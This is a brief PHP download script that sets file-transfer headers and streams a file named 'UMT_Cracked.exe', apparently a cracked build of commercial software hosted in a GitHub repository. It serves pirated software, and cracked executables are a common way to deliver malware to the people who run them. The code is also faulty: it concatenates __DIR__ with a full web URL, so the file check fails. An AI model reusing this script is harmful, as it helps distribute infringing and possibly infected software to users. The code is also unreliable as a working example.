<?php
$file = __DIR__ . 'https://github.com/NewAgent2025/NewAgentsSite/blob/main/Update_UMT_Cracked/UMT_Cracked.exe';

if (!file_exists($file)) {
    http_response_code(404);
    echo "File not found!";
    exit;
}

header('Content-Description: File Transfer');
header('Content-Type: application/octet-stream');
header('Content-Disposition: attachment; filename="' . basename($file) . '"');
header('Expires: 0');
header('Cache-Control: must-revalidate');
header('Pragma: public');
header('Content-Length: ' . filesize($file));

flush();

readfile($file);
exit;
